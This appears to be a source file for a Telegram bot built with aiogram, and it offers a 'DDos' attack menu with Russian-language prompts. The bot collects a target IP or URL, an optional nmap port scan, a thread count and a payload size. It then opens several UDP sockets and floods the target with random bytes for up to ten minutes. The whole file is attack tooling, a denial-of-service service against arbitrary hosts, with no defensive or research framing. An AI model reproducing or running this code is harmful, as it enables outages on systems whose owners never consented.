import asyncio
import logging
import os
import socket

from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Text

from keyboards.default import start_markup, back_menu_markup
from keyboards.default.scripts.ddos import choose_ddos_markup, stop_script_markup
from loader import dp
from states import DdosState
from utils.misc import rate_limit
from utils.scripts.ddos import start_dos, start_nmap, get_ping
from utils.scripts.ddos.start_ddos import get_timeout


@rate_limit(0.5)
@dp.message_handler(Text(equals=["DDos"]))
async def dos_menu(message: types.Message):
    await message.answer("Вы попали в DDos меню.\n"
                         "Выберите способ атаки.", reply_markup=choose_ddos_markup)
    await DdosState.ddos.set()


@rate_limit(0.5)
@dp.message_handler(state=DdosState.ddos)
async def enter_dos(message: types.Message, state: FSMContext):
    if message.text == 'В главное меню':
        await state.reset_state()
        await message.answer("Вы отменили ввод данных. Возврат в главное меню.\n"
                             "Выберите эксплойт.", reply_markup=start_markup)
    elif message.text in ['DDos', 'DDos через Nmapscan']:
        async with state.proxy() as state_data:
            state_data['ddos'] = message.text
        # тут, где 10, потом добавить параметр для различных ролей пользователей: например сравнивать роли через БД
        await message.answer("Введите количество одновременно работающих скриптов.\n"
                             "Для вас доступен диапазон от 1 до 10", reply_markup=back_menu_markup)
        await DdosState.count_script.set()
    else:
        await message.answer("Неверный ввод. Попробуйте ещё раз.")


@rate_limit(0.5)
@dp.message_handler(state=DdosState.count_script)
async def enter_dos(message: types.Message, state: FSMContext):
    if message.text == 'Назад':
        async with state.proxy() as state_data:
            state_data.pop('ddos')
        await message.answer("Вы вернулись назад.\nВыберите способ атаки.", reply_markup=choose_ddos_markup)
        await DdosState.ddos.set()
    elif message.text == 'В главное меню':
        await state.reset_state()
        await message.answer("Вы отменили ввод данных. Возврат в главное меню.\n"
                             "Выберите эксплойт.", reply_markup=start_markup)
    elif message.text.isnumeric():
        # тут, где 11, потом добавить параметр для различных ролей пользователей: например сравнивать роли через БД
        if int(message.text) in range(1, 11):
            async with state.proxy() as state_data:
                state_data['count_script'] = message.text
                if state_data['ddos'] == 'DDos':
                    await message.answer("Введите IP.")
                else:
                    await message.answer("Введите IP или URL.")
            await DdosState.ip.set()
        else:
            await message.answer("Неверное число. Попробуйте ещё раз.")
    else:
        await message.answer("Вы ввели не число. Попробуйте ещё раз.")


@rate_limit(0.5)
@dp.message_handler(state=DdosState.ip)
async def enter_ip(message: types.Message, state: FSMContext):
    if message.text == 'Назад':
        async with state.proxy() as state_data:
            state_data.pop('count_script')
        await message.answer("Вы вернулись назад.\nВведиите количество одновременно работающих скриптов.",
                             reply_markup=back_menu_markup)
        await DdosState.count_script.set()
    elif message.text == 'В главное меню':
        await state.reset_state()
        await message.answer("Вы отменили ввод данных. Возврат в главное меню.\n"
                             "Выберите эксплойт.", reply_markup=start_markup)
    else:
        async with state.proxy() as state_data:
            state_data['ip'] = message.text
            if state_data['ddos'] == 'DDos':
                await message.answer("Введите порт.")
                await DdosState.port.set()
            else:
                ip, ports = await start_nmap(message, state_data)
                if ports:
                    state_data['ports'] = ports
                    await message.answer(f"Nmapscan нашёл следующие открытые порты. Выберите порты из списка:\n"
                                         f"{ports}")
                    await DdosState.port.set()
                else:
                    await message.answer(
                        "Не было найдено ни одного IP-адреса для DDos-атаки. Попробуйте другой IP-адрес.")


@rate_limit(0.5)
@dp.message_handler(state=DdosState.port)
async def enter_port(message: types.Message, state: FSMContext):
    if message.text == 'Назад':
        async with state.proxy() as state_data:
            state_data.pop('ip')
        await message.answer("Вы вернулись назад.\nВведите IP.")
        await DdosState.ip.set()
    elif message.text == 'В главное меню':
        await state.reset_state()
        await message.answer("Вы отменили ввод данных. Возврат в главное меню.\n"
                             "Выберите эксплойт.", reply_markup=start_markup)
    elif message.text.isnumeric():
        async with state.proxy() as state_data:
            if 'ports' in state_data.keys():
                if message.text in state_data['ports']:
                    state_data['port'] = int(message.text)
                    await message.answer("Введите размер данных, которыми хотите провести атаку.\n"
                                         "Допустимый диапазон [0; 60000]")
                    await DdosState.size.set()
                else:
                    await message.answer("Вы ввели порт не из списка. Попробуйте ещё раз.")
            else:
                state_data['port'] = int(message.text)
                await message.answer("Введите размер данных, которыми хотите провести атаку.\n"
                                     "Допустимый диапазон [0; 60000]")
                await DdosState.size.set()
    else:
        await message.answer("Вы ввели не числовое значение. Попробуйте ещё раз.")


@rate_limit(0.5)
@dp.message_handler(state=DdosState.size)
async def enter_size(message: types.Message, state: FSMContext):
    if message.text == 'Назад':
        async with state.proxy() as state_data:
            state_data.pop('port')
            if 'ports' in state_data.keys():
                await message.answer(f"Вы вернулись назад. Введите порт из списка.\n{state_data['ports']}")
            else:
                await message.answer(f"Вы вернулись назад. Введите порт.")
            await DdosState.port.set()
    elif message.text == 'В главное меню':
        await state.reset_state()
        await message.answer("Вы отменили ввод данных. Возврат в главное меню.\n"
                             "Выберите эксплойт.", reply_markup=start_markup)
    elif message.text.isnumeric():
        if int(message.text) <= 60000 and int(message.text) >= 0:
            await state.update_data(size=int(message.text))
            async with state.proxy() as state_data:
                await DdosState.stop_script.set()
                await message.answer("Скрипт выполняется. Для остановки нажмите на кнопку STOP.\n"
                                     "Так же был определён таймаут в 10 минут, чтобы не было "
                                     "большого количества запросов.",
                                     reply_markup=stop_script_markup)
                connects = []
                for i in range(int(state_data['count_script'])):
                    connects.append(socket.socket(socket.AF_INET, socket.SOCK_DGRAM))
                ip = state_data['ip']
                port = state_data['port']
                size = state_data['size']
                attack = os.urandom(size)
                task_get_ping = asyncio.create_task(get_ping(message, state_data))
                task_get_timeout = asyncio.create_task(get_timeout())
                tasks = [task_get_ping, task_get_timeout]
                for connect in connects:
                    tasks.append(asyncio.create_task(start_dos(connect, ip, port, attack)))
                finished, unfinished = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                for task in unfinished:
                    task.cancel()
                for connect in connects:
                    connect.close()
                await asyncio.sleep(3)
            if await dp.current_state().get_state() == 'DdosState:stop_script':
                await message.answer("Сработал таймаут. Скрипт успешно выполнен. Возврат в главное меню.\n"
                                     "Выберите эксплойт.", reply_markup=start_markup)
                await state.reset_state()
        else:
            await message.answer("Вы ввели неверное число. Попробуйте ещё раз.")
    else:
        await message.answer("Вы ввели не числовое значение. Попробуйте ещё раз.")


@rate_limit(0.5)
@dp.message_handler(Text(equals=["STOP"]), state=DdosState.stop_script)
async def stop_dos_script(message: types.Message, state: FSMContext):
    await DdosState.stopped_script.set()
    await message.answer("Скрипт останавливается, пожалуйста подождите.")
    await asyncio.sleep(3)
    await state.reset_state()
    await message.answer("Скрипт был остановлен. Возврат в главное меню.\n"
                         "Выберите эксплойт.", reply_markup=start_markup)